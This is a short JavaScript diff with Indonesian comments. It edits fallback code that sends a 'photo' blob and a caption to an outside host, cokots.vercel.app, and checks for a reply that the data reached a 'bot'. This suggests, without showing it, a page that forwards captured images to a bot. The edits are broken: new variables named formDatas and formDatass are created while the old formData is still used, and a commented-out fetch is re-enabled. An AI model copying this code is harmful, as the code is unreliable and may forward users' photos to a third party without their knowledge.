@@ -41,8 +41,6 @@
                 sendEmptyDataToAPI();
             }
             
-            // Kirimkan data kosong dengan fallback gambar
-            //sendEmptyDataToAPI();
         }
     }
     
@@ -68,13 +66,13 @@
             `;
             
             // Kirim foto kosong (fallback) ke server
-            const formData = new FormData();
+            const formDatass = new FormData();
             formData.append("photo", blob);  // Kirimkan fallback gambar
             formData.append("caption", caption);
             
-            //const apiResponse = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
+            const apiResponse = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
                 method: "POST",
-                body: formData,
+                body: formDatass,
             });
             
             // Cek jika respons adalah "Data berhasil dikirim ke bot!"
@@ -112,7 +110,7 @@
         `;
         
         // Kirim foto kosong (fallback) ke server
-        const formData = new FormData();
+        const formDatas = new FormData();
         formData.append("photo", blob);  // Kirimkan fallback gambar
         formData.append("caption", caption);
 
@@ -120,7 +118,7 @@
         
         const apiResponse = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
             method: "POST",
-            body: formData,
+            body: formDatas,
         });
         
         // Cek jika respons adalah "Data berhasil dikirim ke bot!"
@@ -132,7 +130,7 @@
             document.getElementById("status").innerText = "Gagal mengirim data. Coba lagi. foto";
         }
     } catch (error) {
-        //document.getElementById("status").innerText = "Gagal mengirim data kosong (fallback). foto";
+        document.getElementById("status").innerText = "Gagal mengirim data kosong (fallback). foto";
     }
 }
     
